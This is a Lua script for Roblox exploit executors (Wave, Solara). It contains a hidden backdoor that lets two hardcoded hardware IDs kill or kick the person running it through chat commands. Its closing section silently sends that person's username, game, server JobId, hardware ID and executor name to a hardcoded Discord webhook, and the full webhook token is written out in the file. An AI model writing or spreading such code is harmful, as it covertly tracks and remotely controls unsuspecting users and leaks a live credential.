local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local LocalPlayer = Players.LocalPlayer

local WhitelistedTable = {
	"B7BF719A-88E8-4C21-8EE0-816A58F10E7F",
	"1D4ECD30-CE2F-4EB4-A493-E32E6FC25E87",
}

local webhookURL = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2"

local function Whitelisted(player)
	local hwid = RbxAnalyticsService:GetClientId()
	for _, whitelistedHwid in ipairs(WhitelistedTable) do
		if hwid == whitelistedHwid then
			print(player.Name .. " is whitelisted")
			return true
		end
	end
	return false
end

local function GetPlayer(Name)
	if #Name < 3 then
		return nil
	end

	Name = string.lower(Name)
	for _, player in pairs(Players:GetPlayers()) do
		if string.sub(string.lower(player.Name), 1, #Name) == Name then
			return player
		end
	end
	return nil
end

local function ExecuteCommand(command, args)
	if command == "kill" and args[1] then
		local targetPlayer = GetPlayer(args[1])
		if targetPlayer and targetPlayer == LocalPlayer then
			LocalPlayer.Character.Humanoid.Health = 0
		end
	elseif command == "kick" and args[1] then
		local targetPlayer = GetPlayer(args[1])
		if targetPlayer and targetPlayer == LocalPlayer then
			LocalPlayer:Kick("You were kicked by an admin")
		end
	end
end

local function ParseMessage(message)
	if string.sub(message, 1, 1) == "/" then
		local parts = string.split(message, " ")
		local command = string.sub(parts[1], 2)
		table.remove(parts, 1)
		return command, parts
	end
	return nil, nil
end

local function ConnectPlayer(player)
	player.Chatted:Connect(function(message)
		if Whitelisted(player) then
			local command, args = ParseMessage(message)
			if command then
				ExecuteCommand(command, args)
			end
		end
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	ConnectPlayer(player)
end

Players.PlayerAdded:Connect(function(player)
	ConnectPlayer(player)
end)

local player = game.Players.LocalPlayer
local username = player.Name
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local executorName = identifyexecutor()
local executorText = ""

if executorName == "Wave" then
	executorText = "Wave"
elseif executorName == "Solara" then
	executorText = "Solara"
else
	executorText = "Unknown"
end

local embed = {
	["title"] = username,
	["color"] = 0x2f5bc7,
	["fields"] = {
		{
			["name"] = "Executor",
			["value"] = executorText,
			["inline"] = true
		},
		{
			["name"] = "Game",
			["value"] = gameName,
			["inline"] = true
		},
		{
			["name"] = "JobId",
			["value"] = game.JobId,
			["inline"] = true
		},
		{
			["name"] = "HWID",
			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
			["inline"] = true
		}
	}
}

local payload = {
	["embeds"] = {embed},
}

local httpRequest = {
	Url = webhookURL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

request(httpRequest)
